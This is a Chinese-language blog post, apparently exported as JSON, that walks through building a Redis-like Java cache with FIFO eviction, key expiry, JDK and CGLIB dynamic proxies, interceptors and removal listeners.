[{"title":"MyCache","date":"2023-05-18T14:46:30.000Z","path":"2023/05/18/MyCache/","text":"使用Map开发一个类似于redis的缓存工具 实现固定缓存相关接口为了方便后续扩展首先定义接口ICache继承于Map public interface ICache&lt;K, V&gt; extends Map&lt;K, V&gt; &#123; &#125; 因为缓存的大小有限，所以不能无限制的像cache（也就是Map集合）中添加元素 ，当到达容量上限时，需要从cache中淘汰元素，所以需要添加驱逐策略。 public interface ICacheEvict&lt;K, V&gt; &#123; /** * 驱除策略 * * @param context 上下文 * @since 0.0.2 * @return 被移除的明细，没有时返回 null */ evict(final ICacheEvictContext&lt;K, V&gt; context); &#125; 其中ICacheEvictContext,包含了缓存对象，缓存大小限制，以及需要添加到缓存中的key /** * 缓存驱逐上下文 * @param &lt;K&gt; * @param &lt;V&gt; */ public interface ICacheEvictContext&lt;K, V&gt; &#123; /** * 待缓存的key * @return */ K key(); /** * 缓存对象 * @return */ ICache&lt;K, V &gt; cache(); /** * 缓存大小 * @return */ int size(); &#125; 代码实现CacheEvictContext该类的实现比较简单，实现对单个成员变量的初始化，并返回该对象本身，便于实现fluent流式编程 public class CacheEvictContext&lt;K,V&gt; implements ICacheEvictContext&lt;K, V&gt; &#123; /** * 新加的 key */ private K key; /** * cache 实现 */ private ICache&lt;K,V&gt; cache; /** * 最大的大小 */ private int size; @Override public K key() &#123; return key; &#125; public CacheEvictContext&lt;K, V&gt; key(K key) &#123; this.key = key; return this; &#125; @Override public ICache&lt;K, V&gt; cache() &#123; return cache; &#125; public CacheEvictContext&lt;K, V&gt; cache(ICache&lt;K, V&gt; cache) &#123; this.cache = cache; return this; &#125; @Override public int size() &#123; return size; &#125; public CacheEvictContext&lt;K, V&gt; size(int size) &#123; this.size = size; return this; &#125; &#125; 淘汰策略实现cacheEvict.evict(context);如下 CacheEvictFIFO淘汰策略可以有多种，比如 LRU/LFU/FIFO 等等，我们此处实现一个最基本的 FIFO。 拥有FIFO特性的数据结构就是queue的，那么就用java中LinkedList集合实现该方法。 public class CacheEvictFIFO&lt;K,V&gt; implements ICacheEvict&lt;K,V&gt; &#123; /** * queue按添加顺序保存key信息 */ private Queue&lt;K&gt; queue = new LinkedList&lt;&gt;(); @Override public void evict(ICacheEvictContext&lt;K, V&gt; context) &#123; final ICache&lt;K,V&gt; cache = context.cache(); // 超过限制，执行移除 if(cache.size() &gt;= context.size()) &#123; K evictKey = queue.remove(); // 移除最开始的元素 cache.remove(evictKey); &#125; // 将新加的元素放入队尾 final K key = context.key(); queue.add(key); &#125; &#125; cache核心的cache类，向其中添加一些关键属性 public class Cache&lt;K,V&gt; implements ICache&lt;K,V&gt; &#123; /** * map信息 */ private Map&lt;K,V&gt; map; /** * 缓存大小限制 */ private int sizeLimit; /** * 驱除策略 */ private ICacheEvict&lt;K,V&gt; evict; public Cache(Map&lt;K, V&gt; map, int sizeLimit, ICacheEvict&lt;K, V&gt; evict) &#123; this.map = map; this.sizeLimit = sizeLimit; this.evict = evict; &#125; // Override Map method &#125; 一些方法的重写没有在此贴出，使用快捷键补全后，调用map参数对应的方法即可。 对于put方法的改动比较大 驱逐旧元素 添加新元素 @Override public V put(K key, V value) &#123; //1.1 尝试驱除 CacheEvictContext&lt;K,V&gt; context = new CacheEvictContext&lt;&gt;(); context.key(key).size(sizeLimit).cache(this); cacheEvict.evict(context); //2. 判断驱除后的信息 if(isSizeLimit()) &#123; throw new CacheRuntimeException(&quot;当前队列已满，数据添加失败！&quot;); &#125; //3. 执行添加 return map.put(key, value); &#125; private boolean isSizeLimit() &#123; final int currentSize = this.size(); return currentSize &gt;= this.sizeLimit; &#125; 可以让用户动态指定大小，但是指定大小肯就要有对应的淘汰策略。否则，固定大小的 map 肯定无法放入元素。 CacheBs为了方便用户创建客户端，可以创建一个引导类，这里使用到了fluent流式写法。 /** * 缓存引导类 */ public final class CacheBs&lt;K,V&gt; &#123; private CacheBs()&#123;&#125; /** * 创建对象实例 * @param &lt;K&gt; key * @param &lt;V&gt; value * @return this */ public static &lt;K,V&gt; CacheBs&lt;K,V&gt; newInstance() &#123; return new CacheBs&lt;&gt;(); &#125; /** * map 实现 */ private Map&lt;K,V&gt; map = new HashMap&lt;&gt;(); /** * 大小限制 */ private int size = Integer.MAX_VALUE; /** * 驱除策略 */ private ICacheEvict&lt;K,V&gt; evict = CacheEvicts.fifo(); /** * map 实现 * @param map map * @return this */ public CacheBs&lt;K, V&gt; map(Map&lt;K, V&gt; map) &#123; ArgUtil.notNull(map, &quot;map&quot;); this.map = map; return this; &#125; /** * 设置 size 信息 * @param size size * @return this */ public CacheBs&lt;K, V&gt; size(int size) &#123; ArgUtil.notNegative(size, &quot;size&quot;); this.size = size; return this; &#125; /** * 设置驱除策略 * @param evict 驱除策略 * @return this */ public CacheBs&lt;K, V&gt; evict(ICacheEvict&lt;K, V&gt; evict) &#123; this.evict = evict; return this; &#125; /** * 构建缓存信息 * @return 缓存信息 */ public ICache&lt;K,V&gt; build() &#123; CacheContext&lt;K,V&gt; context = new CacheContext&lt;&gt;(); context.cacheEvict(evict); context.map(map); context.size(size); return new Cache&lt;&gt;(context); &#125; &#125; 测试ICache&lt;String, String&gt; cache = CacheBs.&lt;String,String&gt;newInstance() .size(2) .build(); cache.put(&quot;1&quot;, &quot;1&quot;); cache.put(&quot;2&quot;, &quot;2&quot;); cache.put(&quot;3&quot;, &quot;3&quot;); cache.put(&quot;4&quot;, &quot;4&quot;); System.out.println(cache.keySet()); 默认为先进先出的策略，此时输出 keys，内容如下： [3, 4] 实现key过期redis中可以设置key的过期时间，这是一个非常有用的功能，比如将短信的验证码设置5分钟的过期时间；登录凭证设置一天有效等，这些场景都需要使用。 相关接口ICache首先在ICache中添加两个方法 expire()多久后过期 expireAt()在什么时间过期 public interface ICache&lt;K, V&gt; extends Map&lt;K, V&gt; &#123; /** * 设置过期时间 * （1）如果 key 不存在，则什么都不做。 * （2）暂时不提供新建 key 指定过期时间的方式，会破坏原来的方法。 * * 会做什么： * 类似于 redis * （1）惰性删除。 * 在执行下面的方法时，如果过期则进行删除。 * &#123;@link ICache#get(Object)&#125; 获取 * &#123;@link ICache#values()&#125; 获取所有值 * &#123;@link ICache#entrySet()&#125; 获取所有明细 * * 【数据的不一致性】 * 调用其他方法，可能得到的不是使用者的预期结果，因为此时的 expire 信息可能没有被及时更新。 * 比如 * &#123;@link ICache#isEmpty()&#125; 是否为空 * &#123;@link ICache#size()&#125; 当前大小 * 同时会导致以 size() 作为过期条件的问题。 * * 解决方案：考虑添加 refresh 等方法，暂时不做一致性的考虑。 * 对于实际的使用，我们更关心 K/V 的信息。 * * （2）定时删除 * 启动一个定时任务。每次随机选择指定大小的 key 进行是否过期判断。 * 类似于 redis，为了简化，可以考虑设定超时时间，频率与超时时间成反比。 * * 其他拓展性考虑： * 后期考虑提供原子性操作，保证事务性。暂时不做考虑。 * 此处默认使用 TTL 作为比较的基准，暂时不想支持 LastAccessTime 的淘汰策略。会增加复杂度。 * 如果增加 lastAccessTime 过期，本方法可以不做修改。 * * @param key key * @param timeInMills 毫秒时间之后过期 * @return this */ ICache&lt;K, V&gt; expire(final K key, final long timeInMills); /** * 在指定的时间过期 * @param key key * @param timeInMills 时间戳 * @return this ICache&lt;K, V&gt; expireAt(final K key, final long timeInMills); &#125; ICacheExpire定义缓存过期的处理结构 public interface ICacheExpire&lt;K,V&gt; &#123; /** * 指定过期信息 * @param key key * @param expireAt 什么时候过期 */ void expire(final K key, final long expireAt); /** * 惰性删除中需要处理的 keys * @param keyList keys */ void refreshExpire(final Collection&lt;K&gt; keyList); &#125; 代码实现CacheExpire实现定期删除过期key的思路，开一个线程定时执行，从cache种删除过期的key 需要创建一个集合保存key于expiretime之间的关系 创建一个线程用于清除过期的key private final Map&lt;K, Long&gt; expireMap = new HashMap&lt;&gt;(); @Override public void expire(K key, long expireAt) &#123; expireMap.put(key, expireAt); &#125; 为了防止每次清理的时间占用过长时间，这里限制每次最多清理100 /** * 单次清空的数量限制 */ private static final int LIMIT = 100; /** * 缓存实现 */ private final ICache&lt;K,V&gt; cache; /** * 线程执行类 */ private static final ScheduledExecutorService EXECUTOR_SERVICE = Executors.newSingleThreadScheduledExecutor(); public CacheExpire(ICache&lt;K, V&gt; cache) &#123; this.cache = cache; this.init(); &#125; /** * 初始化任务 */ private void init() &#123; EXECUTOR_SERVICE.scheduleAtFixedRate(new ExpireThread(), 100, 100, TimeUnit.MILLISECONDS); &#125; 创建清理过期key的线程类ExpireThread 此类作为CacheExpire的内部了 private class ExpireThread implements Runnable &#123; @Override public void run() &#123; //1.判断是否为空 if(MapUtil.isEmpty(expireMap)) &#123; return; &#125; //2. 获取 key 进行处理 int count = 0; for(Map.Entry&lt;K, Long&gt; entry : expireMap.entrySet()) &#123; if(count &gt;= LIMIT) &#123; return; &#125; expireKey(entry); count++; &#125; &#125; &#125; 执行清除的函数 /** * 执行过期操作 * @param entry 明细 */ private void expireKey(Map.Entry&lt;K, Long&gt; entry) &#123; final K key = entry.getKey(); final Long expireAt = entry.getValue(); // 删除的逻辑处理 long currentTime = System.currentTimeMillis(); if(currentTime &gt;= expireAt) &#123; expireMap.remove(key); // 再移除缓存，后续可以通过惰性删除做补偿 cache.remove(key); &#125; &#125; 执行流程 当CacheExpire被创建时，会启动定时清除的子线程 当调用cache.expire()和cache.expireAt()方法时，会将key与expiretime保存到expireMap 子线程不断执行，检查expireMap是否为空 为空，则结束本次执行 不为空，检查清除操作 优化如果过期的应用场景不多，那么经常轮训的意义实际不大。 比如我们的任务 99% 都是在凌晨清空数据，白天无论怎么轮询，纯粹是浪费资源。 那有没有什么方法，可以快速的判断有没有需要处理的过期元素呢？ 答案是有的，那就是排序的 MAP。 我们换一种思路，让过期的时间做 key，相同时间的需要过期的信息放在一个列表中，作为 value。 然后对过期时间排序，轮询的时候就可以快速判断出是否有过期的信息了。 CacheExpireSortpublic class CacheExpireSort&lt;K,V&gt; implements ICacheExpire&lt;K,V&gt; &#123; /** * 单次清空的数量限制 */ private static final int LIMIT = 100; /** * 排序缓存存储 * 使用按照时间排序的缓存处理。 */ private final Map&lt;Long, List&lt;K&gt;&gt; sortMap = new TreeMap&lt;&gt;(new Comparator&lt;Long&gt;() &#123; @Override public int compare(Long o1, Long o2) &#123; return (int) (o1-o2); &#125; &#125;); /** * 过期 map * * 空间换时间 */ private final Map&lt;K, Long&gt; expireMap = new HashMap&lt;&gt;(); /** * 缓存实现 */ private final ICache&lt;K,V&gt; cache; /** * 线程执行类 */ private static final ScheduledExecutorService EXECUTOR_SERVICE = Executors.newSingleThreadScheduledExecutor(); public CacheExpireSort(ICache&lt;K, V&gt; cache) &#123; this.cache = cache; this.init(); &#125; /** * 初始化任务 */ private void init() &#123; EXECUTOR_SERVICE.scheduleAtFixedRate(new ExpireThread(), 1, 1, TimeUnit.SECONDS); &#125; /** * 定时执行任务 */ private class ExpireThread implements Runnable &#123; @Override public void run() &#123; //1.判断是否为空 if(MapUtil.isEmpty(sortMap)) &#123; return; &#125; //2. 获取 key 进行处理 int count = 0; for(Map.Entry&lt;Long, List&lt;K&gt;&gt; entry : sortMap.entrySet()) &#123; final Long expireAt = entry.getKey(); List&lt;K&gt; expireKeys = entry.getValue(); // 判断队列是否为空 if(CollectionUtil.isEmpty(expireKeys)) &#123; sortMap.remove(expireAt); continue; &#125; if(count &gt;= LIMIT) &#123; return; &#125; // 删除的逻辑处理 long currentTime = System.currentTimeMillis(); if(currentTime &gt;= expireAt) &#123; Iterator&lt;K&gt; iterator = expireKeys.iterator(); while (iterator.hasNext()) &#123; K key = iterator.next(); // 先移除本身 iterator.remove(); expireMap.remove(key); // 再移除缓存，后续可以通过惰性删除做补偿 cache.remove(key); count++; &#125; &#125; else &#123; // 直接跳过，没有过期的信息 return; &#125; &#125; &#125; &#125; @Override public void expire(K key, long expireAt) &#123; List&lt;K&gt; keys = sortMap.get(expireAt); if(keys == null) &#123; keys = new ArrayList&lt;&gt;(); &#125; keys.add(key); // 设置对应的信息 sortMap.put(expireAt, keys); expireMap.put(key, expireAt); &#125; &#125; Cache添加成员变量 private ICacheExpire&lt;K,V&gt; expire; 构造方法 public Cache(Map&lt;K, V&gt; map, int sizeLimit, ICacheEvict&lt;K, V&gt; evict) &#123; this.map = map; this.sizeLimit = sizeLimit; this.evict = evict; // 修改过期策略时，修改此处即可 this.expire = new CacheExpire&lt;&gt;(this); &#125; 方法实现，为了方便起见，将两种过期方式转换为一种,多长时间后过期 @Override public ICache&lt;K, V&gt; expire(K key, long timeInMills) &#123; long expireTime = System.currentTimeMillis() + timeInMills; return this.expireAt(key, expireTime); &#125; @Override public ICache&lt;K, V&gt; expireAt(K key, long timeInMills) &#123; this.cacheExpire.expire(key, timeInMills); return this; &#125; 惰性删除类似于 redis，我们采用定时删除的方案，就有一个问题：可能数据清理的不及时。那当我们查询时，可能获取到到是脏数据。 当我们关心某些数据时，才对数据做对应的删除判断操作，这样压力会小很多。 需要惰性删除的方法：各种数据查询的方法 @Override @SuppressWarnings(&quot;unchecked&quot;) public V get(Object key) &#123; //1. 刷新所有过期信息 K genericKey = (K) key; this.cacheExpire.refreshExpire(Collections.singletonList(genericKey)); return map.get(key); &#125; 在获取数据之前对数据进行刷新，就是refreshExpire()函数 public void refreshExpire(Collection&lt;K&gt; keyList) &#123; if(CollectionUtil.isEmpty(keyList)) &#123; return; &#125; // 判断大小。一般都是过期的 keys 比较小。 if(keyList.size() &lt;= expireMap.size()) &#123; for(K key : keyList) &#123; expireKey(key); &#125; &#125; else &#123; for(Map.Entry&lt;K, Long&gt; entry : expireMap.entrySet()) &#123; this.expireKey(entry); &#125; &#125; &#125; 创建代理对象相关接口ICacheProxy因为后面要实现几种类型的代理对象，所以先抽象出一个接口，方便使用 public interface ICacheProxy &#123; /** * 获取代理实现 * @return 代理 */ Object proxy(); &#125; ICacheProxyBsContext /** * 拦截器信息 * @return 拦截器 */ CacheInterceptor interceptor(); /** * 获取代理对象信息 * @return 代理 */ ICache target(); /** * 目标对象 * @param target 对象 * @return 结果 */ ICacheProxyBsContext target(final ICache target); /** * 参数信息 * @return 参数信息 */ Object[] params(); /** * 方法信息 * @return 方法信息 */ Method method(); /** * 方法执行 * @return 执行 * @throws Throwable 异常信息 */ Object process() throws Throwable; 接口实现CacheProxyBsContextpublic class CacheProxyBsContext implements ICacheProxyBsContext &#123; /** * 代理目标对象 */ private ICache target; /** * 方法执行的参数 */ private Object[] params; /** * 方法 * @since 0.0.4 */ private Method method; /** * 新建对象 * @return 对象 */ public static CacheProxyBsContext newInstance()&#123; return new CacheProxyBsContext(); &#125; @Override public CacheInterceptor interceptor() &#123; return interceptor; &#125; @Override public ICache target() &#123; return target; &#125; @Override public ICacheProxyBsContext target(ICache target) &#123; this.target = target; return this; &#125; @Override public Object[] params() &#123; return params; &#125; public CacheProxyBsContext params(Object[] params) &#123; this.params = params; return this; &#125; @Override public Method method() &#123; return method; &#125; public CacheProxyBsContext method(Method method) &#123; this.method = method; return this; &#125; @Override public Object process() throws Throwable &#123; //通过反射调用方法 也就是目标代理对象要执行的方法 return this.method.invoke(target, params); &#125; &#125; 引导类代理对象创建 public class CacheProxyBs &#123; private CacheProxyBs()&#123;&#125; /** * 代理上下文 */ private ICacheProxyBsContext context; public static CacheProxyBs newInstance()&#123; return new CacheProxyBs(); &#125; public CacheProxyBs context(ICacheProxyBsContext context) &#123; this.context = context; return this; &#125; /** * 该方法在每个方法执行之前会获取其执行的具体信息 * 包括执方法名，参数，执行结果，执行结果 * 在执行前会打印执行时间 * 然后记录执行时间 * 打印最后的执行时间 * @return * @throws Throwable */ @SuppressWarnings(&quot;all&quot;) public Object execute() throws Throwable &#123; long startMills = System.currentTimeMillis(); final ICache cache = context.target(); Object result = context.process(); return result; &#125; &#125; 代理对象创建代理对象的目的是为了对Map的原方法进行一些增强，比如统计某次调用的执行时间，可以在调用前记录下时间后，再调用目标对象的方法，之后再用当前时间减去调用前的时间，即可获取本次调用花费的时间。这个可以用于统计慢操作日志，后续会进行开发。 此外结合自定义注解，可以在一些需要加监听器的方法上添加对应注解，即可在调用此方法时，进行一些操作，比如刷新操作。 jdk动态代理在java动态代理机制中，InvocationHandler接口和Proxy 类是核心。 Proxy 类中使用频率最高的方法是：newProxyInstance() ，这个方法主要用来生成一个代理对象。 @CallerSensitive public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) 这个方法一共有 3 个参数： loader :类加载器，用于加载代理对象。 interfaces : 被代理类实现的一些接口； h : 实现了 InvocationHandler 接口的对象； 要实现动态代理的话，还必须需要实现InvocationHandler 来自定义处理逻辑。 当我们的动态代理对象调用一个方法时候，这个方法的调用就会被转发到实现InvocationHandler 接口类的 invoke 方法来调用。 public interface InvocationHandler &#123; /** * 当你使用代理对象调用方法的时候实际会调用到这个方法 */ public Object invoke(Object proxy, Method method, Object[] args) throws Throwable; &#125; invoke()有三个参数 proxy :动态生成的代理类 method : 与代理类对象调用的方法相对应 args : 当前 method 方法的参数 也就是说：通过Proxy 类的 newProxyInstance() 创建的代理对象在调用方法的时候，实际会调用到实现InvocationHandler 接口的类的 invoke()方法。 你可以在 invoke() 方法中自定义处理逻辑，比如在方法执行前后做什么事情。 JDK 动态代理类使用步骤 定义一个接口及其实现类； 自定义InvocationHandler并重写invoke方法，在 invoke 方法中我们会调用原生方法（被代理类的方法）并自定义一些处理逻辑； 通过 Proxy.newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)方法创建代理对象； public class DynamicProxy implements InvocationHandler, ICacheProxy &#123; /** * 被代理的目标对象 */ private final ICache target; public DynamicProxy(ICache target) &#123; this.target = target; &#125; /** * 这种方式虽然实现了异步执行，但是存在一个缺陷： * 强制用户返回值为 Future 的子类。 * * 如何实现不影响原来的值，要怎么实现呢？ * @param proxy 原始对象 * @param method 方法 * @param args 入参 * @return 结果 * @throws Throwable 异常 */ @Override @SuppressWarnings(&quot;all&quot;) public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; ICacheProxyBsContext context = CacheProxyBsContext.newInstance() .method(method).params(args).target(target); return CacheProxyBs.newInstance().context(context).execute(); // execute() /* public Object execute() throws Throwable &#123; long startMills = System.currentTimeMillis(); final ICache cache = context.target(); Object result = context.process(); return result; */ // process() 就是通过反射的方式调用目标对象的方法 // this.method.invoke(target, params); &#125; &#125; @Override public Object proxy() &#123; // 我们要代理哪个真实对象，就将该对象传进去，最后是通过该真实对象来调用其方法的 InvocationHandler handler = new DynamicProxy(target); return Proxy.newProxyInstance(handler.getClass().getClassLoader(), target.getClass().getInterfaces(), handler); &#125; &#125; cglib动态代理JDK 动态代理有一个最致命的问题是其只能代理实现了接口的类。 CGLIB(Code Generation Library)是一个基于ASM的字节码生成库，它允许我们在运行时对字节码进行修改和动态生成。CGLIB 通过继承方式实现代理。很多知名的开源框架都使用到了CGLIB， 例如 Spring 中的 AOP 模块中：如果目标对象实现了接口，则默认采用 JDK 动态代理，否则采用 CGLIB 动态代理。 在CGLIB动态代理机制中MethodInterceptor接口和Enhancer类的核心 所以要自定义自定义 MethodInterceptor并重写intercept方法，intercept用于拦截增强被代理类的方法。 public interface MethodInterceptor extends Callback&#123; // 拦截被代理类中的方法 public Object intercept(Object obj, java.lang.reflect.Method method, Object[] args, MethodProxy proxy) throws Throwable; &#125; obj :被代理的对象（需要增强的对象） method :被拦截的方法（需要增强的方法） args :方法入参 methodProxy :用于调用原始方法 你可以通过 Enhancer类来动态获取被代理类，当代理类调用方法的时候，实际调用的是 MethodInterceptor 中的 intercept 方法。 CGLIB 动态代理类使用步骤 定义一个类； 自定义MethodInterceptor 并重写intercept方法，intercept 用于拦截增强被代理类的方法，和 JDK 动态代理中的 invoke 方法类似； 通过 Enhancer 类的 create()创建代理类； 添加maven依赖 &lt;dependency&gt; &lt;groupId&gt;cglib&lt;/groupId&gt; &lt;artifactId&gt;cglib&lt;/artifactId&gt; &lt;version&gt;3.3.0&lt;/version&gt; &lt;/dependency&gt; 代理实现 public class CglibProxy implements MethodInterceptor, ICacheProxy &#123; /** * 被代理的对象 */ private final ICache target; public CglibProxy(ICache target) &#123; this.target = target; &#125; @Override public Object intercept(Object o, Method method, Object[] params, MethodProxy methodProxy) throws Throwable &#123; ICacheProxyBsContext context = CacheProxyBsContext.newInstance() .method(method).params(params).target(target); return CacheProxyBs.newInstance().context(context).execute(); &#125; @Override public Object proxy() &#123; Enhancer enhancer = new Enhancer(); //目标对象类 enhancer.setSuperclass(target.getClass()); enhancer.setCallback(this); //通过字节码技术创建目标对象类的子类实例作为代理 return enhancer.create(); &#125; &#125; 获取代理对象创建一个获取代理对象的工厂类 public final class CacheProxy &#123; private CacheProxy()&#123;&#125; /** * 获取对象代理 * @param &lt;K&gt; 泛型 key * @param &lt;V&gt; 泛型 value * @param cache 对象代理 * @return 代理信息 */ @SuppressWarnings(&quot;all&quot;) public static &lt;K,V&gt; ICache&lt;K,V&gt; getProxy(final ICache&lt;K,V&gt; cache) &#123; if(ObjectUtil.isNull(cache)) &#123; return (ICache&lt;K,V&gt;) new NoneProxy(cache).proxy(); &#125; final Class clazz = cache.getClass(); // 如果targetClass本身是个接口或者targetClass是JDK Proxy生成的,则使用JDK动态代理。 // 参考 spring 的 AOP 判断 if (clazz.isInterface() || Proxy.isProxyClass(clazz)) &#123; return (ICache&lt;K,V&gt;) new DynamicProxy(cache).proxy(); &#125; return (ICache&lt;K,V&gt;) new CglibProxy(cache).proxy(); &#125; &#125; 实现监听器注解该注解的作用域是方法 /** * 缓存拦截器注解 */ @Documented @Inherited @Target(ElementType.METHOD) @Retention(RetentionPolicy.RUNTIME) public @interface CacheInterceptor &#123; /** * 通用拦截器 * * 1. 耗时统计 * 2. 慢日志统计 * * etc. * @return 默认开启 */ boolean common() default true; &#125; 那么如何使用注解呢？ 创建一个测试类，添加两个公用方法 public class test &#123; @CacheInterceptor public void test1()&#123; System.out.println(&quot;test1&quot;); &#125; public void test2() &#123; System.out.println(&quot;test2&quot;); &#125; &#125; 那么如何判断方法是否加了注解 public static void main(String[] args) &#123; Method[] methods = test.class.getMethods(); for (Method method : methods) &#123; System.out.println(method.getName()); System.out.println(method.getAnnotation(CacheInterceptor.class)); &#125; &#125; 如果方法上加了@CacheInterceptor注解，那么就能看到一下的打印信息 test2 null test1 @com.sunzy.annotation.CacheInterceptor(common=true) 所以用这种方法判断，在哪些方法执行时，需要进行相应的处理。 相关接口ICacheInterceptorContext为监听器执行时提供相关参数 public interface ICacheInterceptorContext&lt;K, V&gt;&#123; /** * 缓存信息 * @return 缓存信息 */ ICache&lt;K,V&gt; cache(); /** * 执行的方法信息 * @return 方法 */ Method method(); /** * 执行的参数 * @return 参数 */ Object[] params(); /** * 方法执行的结果 * @return 结果 */ Object result(); /** * 开始时间 * @return 时间 */ long startMills(); /** * 结束时间 * @return 时间 */ long endMills(); &#125; ICacheInterceptor在执行方法前后需要执行的操作 public interface ICacheInterceptor&lt;K,V&gt; &#123; /** * 方法执行之前 * @param context 上下文 */ void before(ICacheInterceptorContext&lt;K,V&gt; context); /** * 方法执行之后 * @param context 上下文 */ void after(ICacheInterceptorContext&lt;K,V&gt; context); &#125; 接口实现类CacheInterceptorCost执行耗时统计监听器，再添加一个慢日志阈值即可实现判断是否为慢操作 public class CacheInterceptorCost&lt;K, V&gt; implements ICacheInterceptor&lt;K, V&gt; &#123; private static final Log log = LogFactory.getLog(CacheInterceptorCost.class); @Override public void before(ICacheInterceptorContext&lt;K, V&gt; context) &#123; log.debug(&quot;Cost start, method: &#123;&#125;&quot;, context.method().getName()); &#125; @Override public void after(ICacheInterceptorContext&lt;K, V&gt; context) &#123; long costMills = context.endMills() - context.startMills(); String methodName = context.method().getName(); log.debug(&quot;Cost end, method: &#123;&#125;, cost: &#123;&#125;ms&quot;, methodName, costMills); // 添加慢操作日志 List&lt;ICacheSlowListener&gt; slowListenerList = context.cache().slowListeners(); if (CollectionUtil.isNotEmpty(slowListenerList))&#123; CacheSlowListenerContext listenerContext = CacheSlowListenerContext.newInstance() .startTimeMills(context.startMills()) .endTimeMills(context.endMills()) .costTimeMills(costMills) .methodName(methodName) .params(context.params()) .result(context.result()); for (ICacheSlowListener slowListener : slowListenerList) &#123; // 超过慢日志的阈值 则认定为满操作 if(costMills &gt;= slowListener.slowerThanMills())&#123; slowListener.listen(listenerContext); &#125; &#125; &#125; &#125; &#125; CacheInterceptorContext监听器执行的上下文 public class CacheInterceptorContext&lt;K,V&gt; implements ICacheInterceptorContext&lt;K,V&gt; &#123; private ICache&lt;K,V&gt; cache; /** * 执行的方法信息 */ private Method method; /** * 执行的参数 */ private Object[] params; /** * 方法执行的结果 */ private Object result; /** * 开始时间 */ private long startMills; /** * 结束时间 */ private long endMills; public static &lt;K,V&gt; CacheInterceptorContext&lt;K,V&gt; newInstance() &#123; return new CacheInterceptorContext&lt;&gt;(); &#125; @Override public ICache&lt;K, V&gt; cache() &#123; return cache; &#125; public CacheInterceptorContext&lt;K, V&gt; cache(ICache&lt;K, V&gt; cache) &#123; this.cache = cache; return this; &#125; @Override public Method method() &#123; return method; &#125; public CacheInterceptorContext&lt;K, V&gt; method(Method method) &#123; this.method = method; return this; &#125; @Override public Object[] params() &#123; return params; &#125; public CacheInterceptorContext&lt;K, V&gt; params(Object[] params) &#123; this.params = params; return this; &#125; @Override public Object result() &#123; return result; &#125; public CacheInterceptorContext&lt;K, V&gt; result(Object result) &#123; this.result = result; return this; &#125; @Override public long startMills() &#123; return startMills; &#125; public CacheInterceptorContext&lt;K, V&gt; startMills(long startMills) &#123; this.startMills = startMills; return this; &#125; @Override public long endMills() &#123; return endMills; &#125; public CacheInterceptorContext&lt;K, V&gt; endMills(long endMills) &#123; this.endMills = endMills; return this; &#125; &#125; CacheProxyBs在CacheProxyBs添加相关监听器 public class CacheProxyBs &#123; private CacheProxyBs()&#123;&#125; /** * 代理上下文 */ private ICacheProxyBsContext context; /** * 默认通用拦截器 * * JDK 的泛型擦除导致这里不能使用泛型 */ @SuppressWarnings(&quot;all&quot;) private final List&lt;ICacheInterceptor&gt; commonInterceptors = CacheInterceptors.defaultCommonList(); public static CacheProxyBs newInstance()&#123; return new CacheProxyBs(); &#125; public CacheProxyBs context(ICacheProxyBsContext context) &#123; this.context = context; return this; &#125; /** * 该方法在每个方法执行之前会获取其执行的具体信息 * 包括执方法名，参数，执行结果，执行结果 * 在执行前会打印执行时间 * 然后记录执行时间 * 打印最后的执行时间 * @return * @throws Throwable */ @SuppressWarnings(&quot;all&quot;) public Object execute() throws Throwable &#123; long startMills = System.currentTimeMillis(); final ICache cache = context.target(); Object result = context.process(); return result; &#125; &#125; 通过注解判断，需要执行什么监听器 private void interceptorHandler(CacheInterceptor cacheInterceptor, CacheInterceptorContext interceptorContext, ICache cache, boolean before) &#123; if(cacheInterceptor != null) &#123; //1. 通用 if(cacheInterceptor.common()) &#123; for(ICacheInterceptor interceptor : commonInterceptors) &#123; if(before) &#123; interceptor.before(interceptorContext); &#125; else &#123; interceptor.after(interceptorContext); &#125; &#125; &#125; &#125; &#125; 修改代理对象调用的方法execute() public Object execute() throws Throwable &#123; //1. 开始的时间 final long startMills = System.currentTimeMillis(); final ICache cache = context.target(); CacheInterceptorContext interceptorContext = CacheInterceptorContext.newInstance() .startMills(startMills) .method(context.method()) .params(context.params()) .cache(context.target()); //1. 获取刷新注解信息 CacheInterceptor cacheInterceptor = context.interceptor(); this.interceptorHandler(cacheInterceptor, interceptorContext, cache, true); //2. 正常执行 Object result = context.process(); final long endMills = System.currentTimeMillis(); interceptorContext.endMills(endMills).result(result); // 方法执行完成 this.interceptorHandler(cacheInterceptor, interceptorContext, cache, false); return result; &#125; CacheBs修改引导类对象中的build()方法 public ICache&lt;K,V&gt; build() &#123; Cache&lt;K,V&gt; cache = new Cache&lt;&gt;(); cache.map(map); cache.evict(evict); cache.sizeLimit(size); // 初始化 cache.init(); // 创建代理对象 return CacheProxy.getProxy(cache); &#125; 测试ICache&lt;String, String&gt; cache = CacheBs.&lt;String,String&gt;newInstance() .size(3) .build(); cache.put(&quot;1&quot;, &quot;1&quot;); cache.put(&quot;2&quot;, &quot;2&quot;); cache.expire(&quot;1&quot;, 10); TimeUnit.MILLISECONDS.sleep(50); System.out.println(cache.keySet()); 持久化redis的持久化有两种RDB和AOF，由于项目中这两种方案的实现比较简陋，就不在此多介绍了 可以看这篇 从零手写实现redis（三）内存数据如何重启不丢失？ (qq.com) 数据删除监听器当 有数据被从cache中删除时，在控制台中打印出详细信息，这就涉及到两种删除操作 当cache容量已满，数据被淘汰 设置过期时间的key，到达过期时间 所以需要针对以上两种添加监听器 相关接口ICacheRemoveListener将监听器抽象成一个接口，方便后续添加不同的监听器 public interface ICacheRemoveListener&lt;K,V&gt; &#123; /** * 监听 * @param context 上下文 */ void listen(final ICacheRemoveListenerContext&lt;K,V&gt; context); &#125; ICacheRemoveListenerContext监听器执行时需要的参数 public interface ICacheRemoveListenerContext&lt;K,V&gt; &#123; /** * 清空的 key * @return key */ K key(); /** * 值 * @return 值 */ V value(); /** * 删除类型 * @return 类型 */ String type(); &#125; 接口实现CacheRemoveListener移除操作的实现比较简单，当有key被删除时，在控制台中打印出本次操作的key,value以及移除的类型(evict，expire)，所以还需要一个枚举类，来表示操作的类型。 public class CacheRemoveListener&lt;K,V&gt; implements ICacheRemoveListener&lt;K,V&gt; &#123; private static final Log log = LogFactory.getLog(CacheRemoveListener.class); @Override public void listen(ICacheRemoveListenerContext&lt;K, V&gt; context) &#123; log.debug(&quot;Remove key: &#123;&#125;, value: &#123;&#125;, type: &#123;&#125;&quot;, context.key(), context.value(), context.type()); &#125; &#125; 